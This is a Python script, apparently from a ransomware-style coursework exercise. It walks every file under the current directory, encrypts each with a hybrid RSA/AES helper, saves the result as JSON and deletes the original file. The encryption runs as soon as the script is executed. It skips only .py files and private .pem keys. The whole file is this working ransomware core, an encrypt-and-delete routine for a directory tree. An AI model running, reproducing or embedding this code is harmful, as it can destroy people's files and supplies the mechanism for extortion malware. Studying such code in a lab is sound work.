from myRsaEncrypt import *
import json, os, base64
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from constants import *
from Myencrypt import *

def EncryptFiles():
    
    # Generate the keys if they don't exist 
    generateRSAKeys(KEYS_FILE_PATH)

    # loop through all files under our cwd    
    for root, dirs, files in os.walk(".", topdown=True):
        for name in files:
            
            # get the file name 
            file = os.path.join(root, name)

            # skip encrypting the private key
            if "private" in file and file.endswith(".pem") or file.endswith(".py"):
                continue

            
            # Encrypt the file 
            RSACipher, C, IV, ext, tag = MyRSAEncrypt(file, KEYS_FILE_PATH + '/public_key.pem')


            # intitilize dictionary to store the json information
            jsonFile = dict()
            jsonFile['RSACipher'] = base64.b64encode(RSACipher).decode('utf-8')
            jsonFile['C'] = base64.b64encode(C).decode('utf-8')
            jsonFile['IV'] =  base64.b64encode(IV).decode('utf-8')
            jsonFile['ext'] = ext
            jsonFile['tag'] = base64.b64encode(tag).decode('utf-8')

            # write to json file
            newFileName = os.path.splitext(file)[0]
            fileWrite = open(str(newFileName)+".json", 'w')
            json.dump(jsonFile, fileWrite)
            os.remove(file)

EncryptFiles()
